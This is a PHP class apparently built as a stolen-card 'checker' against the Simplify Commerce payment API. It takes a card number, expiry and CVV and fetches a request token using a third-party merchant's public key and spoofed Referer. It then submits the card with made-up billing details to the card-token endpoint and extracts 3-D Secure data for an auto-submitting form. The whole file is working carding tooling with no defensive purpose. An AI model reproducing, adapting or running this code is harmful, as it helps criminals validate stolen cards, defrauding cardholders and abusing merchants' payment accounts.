<?php  
class Simplify
{
	public $checker_info;
	public $checker_data;
	public $cc;
	public $mm;
	public $yyyy;
	public $cvv;
	public $log;
	  
	public function __construct($card){
	    
	  list($this->cc, $this->mm, $this->yyyy, $this->cvv) = $card;
	  $this->yy = substr($this->yyyy, 2, 4);
	  $this->log[] = 'OK';
	  $this->checker_data['files']['global']['main_checkout'] = 'main_checkout_paymaya.txt';
	  $this->checker_data['files']['cookies'] = ['first' => mt_rand().'.txt', 'second' => mt_rand().'.txt'];
	  $this->checker_data['paymaya']['ua'] = 'Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36';
	    
	}
	public function gst($str, $tite, $salsal){
	  
	  $c = explode($tite, $str);
	  $d = explode($salsal, $c[1]);
	  return $d[0];
	  
	}

	public function love()
	  {
		$ch = curl_init();

		curl_setopt($ch, CURLOPT_URL, 'https://www.simplify.com/commerce/checkout/validateDomain?key=lvpb_ZGIyN2NkMmItMTZjMy00MzhhLTkzMjktOTZiMjExM2UzZjk1');
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');

		curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
		$headers = array();
		$headers[] = 'Connection: keep-alive';
		$headers[] = 'Upgrade-Insecure-Requests: 1';
		$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36';
		$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
		$headers[] = 'Sec-Fetch-Site: cross-site';
		$headers[] = 'Sec-Fetch-Mode: navigate';
		$headers[] = 'Sec-Fetch-Dest: iframe';
		$headers[] = 'Referer: https://cucin.com.au/';
		$headers[] = 'Accept-Language: en-US,en;q=0.9';
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
		$cf = curl_exec($ch);
		$this->gs = $this->gst($cf, "? '","'");    
  }
  	public function titi()
	  {
		$ch = curl_init();

		curl_setopt($ch, CURLOPT_URL, 'https://api.simplify.com/v1/api/payment/cardToken');
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, '{"key":"lvpb_ZGIyN2NkMmItMTZjMy00MzhhLTkzMjktOTZiMjExM2UzZjk1","card":{"name":"awiuodawoid uawoidu","addressLine1":"iuxewav","addressCity":"evwakjeva","addressState":"NSW","addressZip":"9301","addressCountry":"AU","number":"'.$this->cc.'","type":"visa","expMonth":"'.$this->mm.'","expYear":"'.$this->yy.'","cvc":"'.$this->cvv.'"},"secure3DRequestData":{"amount":"1220","currency":"AUD","description":"Hosted Payment","isTransactionSecure3dRequired":false},"source":"SIMPLIFYJS","session_id":"075723b5dcb386210662f36bde3500d1"}');
		curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

		$headers = array();
		$headers[] = 'Connection: keep-alive';
		$headers[] = 'Accept: */*';
		$headers[] = 'X-Requested-With: XMLHttpRequest';
		$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36';
		$headers[] = 'Content-Type: application/json;charset=UTF-8';
		$headers[] = 'Origin: https://api.simplify.com';
		$headers[] = 'Sec-Fetch-Site: same-origin';
		$headers[] = 'Sec-Fetch-Mode: cors';
		$headers[] = 'Sec-Fetch-Dest: empty';
		$headers[] = 'Referer: https://api.simplify.com/v1/api/payment/cardToken/proxy.html?xdm_e=https%3A%2F%2Fwww.simplify.com&xdm_c=default9778&xdm_p=1';
		$headers[] = 'Accept-Language: en-US,en;q=0.9';
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

		$js = curl_exec($ch);
		$this->titi = json_decode($js,true);
		$this->id = $this->gst($js, ',"id":"','"}');
		$url = $this->titi['card']['secure3DData']['acsUrl'];
		$TermUrl = $this->titi['card']['secure3DData']['termUrl'];
		$PaReq = $this->titi['card']['secure3DData']['paReq'];
		$MD = $this->titi['card']['secure3DData']['md'];

		$this->checker_data['construct'] = ['url' => $url, 'TermUrl' => $TermUrl, 'PaReq' => $PaReq, 'MD' => $MD];
  }
    public function orchestrate(){
    
    $_SESSION['values'] = $this->checker_data['construct'];
    $id = $this->id;
    $requestToken = $this->gs;
    echo json_encode(['checkout_id' => $id,'requestToken' => $requestToken]);
    
  }
  
	public function exhibitForm($argdd){
	  extract($argdd);
	  echo "<form action='$url' id='3ds' method='POST'><input type='hidden' name='PaReq' value='$PaReq'><input type='hidden' name='MD' value='$MD'><input type='hidden' name='TermUrl' value='$TermUrl'>".'<script type="text/javascript">window.onload=function(){document.forms["3ds"].submit();}</script>';
	}
}

?>